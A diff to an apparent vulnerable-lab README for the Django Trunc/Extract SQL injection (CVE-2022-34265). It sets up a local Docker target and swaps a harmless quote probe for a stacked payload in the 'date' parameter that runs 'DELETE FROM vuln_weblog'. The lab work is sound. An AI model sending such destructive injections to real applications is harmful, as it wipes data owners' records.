@@ -1,6 +1,5 @@
 # Django Trunc(kind) and Extract(lookup_name) SQL Injection (CVE-2022-34265)
 
-[中文版本(Chinese version)](README.zh-cn.md)
 
 Django is a high-level Python web framework that encourages rapid development and clean, pragmatic design.
 
@@ -16,7 +15,7 @@ References:
 Execute the following command to start a vulnerable Django 4.0.5 server:
 
 ```
-docker compose up -d
+docker compose up
 ```
 
 After the server is started, you can access the web page at `http://your-ip:8000`.
@@ -30,7 +29,7 @@ The web application uses the `Trunc` function to aggregate page click counts by 
 To exploit the SQL injection vulnerability, modify the `date` parameter with malicious input:
 
 ```
-http://your-ip:8000/?date=xxxx'xxxx
+http://localhost:8000/?date=minute', NOW()) FROM vuln_weblog; DELETE FROM vuln_weblog; --  
 ```
 
 The SQL error message will be displayed, confirming the successful injection:
